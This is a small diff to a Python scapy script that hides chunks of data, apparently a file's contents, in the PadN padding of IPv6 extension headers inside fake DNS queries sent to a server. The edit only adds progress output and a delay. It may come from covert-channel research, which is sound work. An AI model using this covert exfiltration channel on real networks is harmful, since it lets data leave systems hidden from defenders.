@@ -19,12 +19,13 @@ whohas = filename + '.' + str(len(msglist)) + '.ncnu.org'
 # Send
 s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
 s.bind((str(conf.iface), 0))
-#pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(optdata=filename))/UDP(sport=53, dport=53)/DNS(id=0, qd=DNSQR(qname=whohas, qtype="A"))
-#s.sendall(dnsMAC + clientMAC + ethertype + bytes(pkt))
+print("Start sending...")
 for i in range(len(msglist)):
     myid = i
     pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(optdata=msglist[i]))/UDP(sport=53, dport=53)/DNS(id=myid, qd=DNSQR(qname=whohas, qtype="A"))
     s.sendall(dnsMAC + clientMAC + ethertype + bytes(pkt))
+    print("Packets sended: {}".format(i), end = '\r')
+    time.sleep(0.003)
 stop = time.time() # Timer
 print("Finished sending {} packets.".format(len(msglist)))
 print("Time: {:.2f} seconds.".format(stop - start))
